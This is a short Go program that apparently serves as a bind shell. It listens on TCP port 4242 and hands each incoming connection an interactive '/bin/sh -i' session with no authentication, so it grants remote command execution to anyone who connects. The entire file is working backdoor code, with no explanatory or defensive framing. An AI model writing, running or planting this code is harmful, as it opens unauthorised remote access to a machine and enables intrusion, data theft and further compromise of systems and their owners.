package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func main() {
	listener, err := net.Listen("tcp", ":4242")
	if err != nil {
		log.Fatal(err)
	}
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatal(err)
		}
		go handle(conn)
	}
}
func handle(conn net.Conn) {

	cmd := exec.Command("/bin/sh", "-i")

	readPipe, writePipe := io.Pipe()

	cmd.Stdin = conn

	cmd.Stdout = writePipe

	go io.Copy(conn, readPipe)

	cmd.Run()
	conn.Close()

}
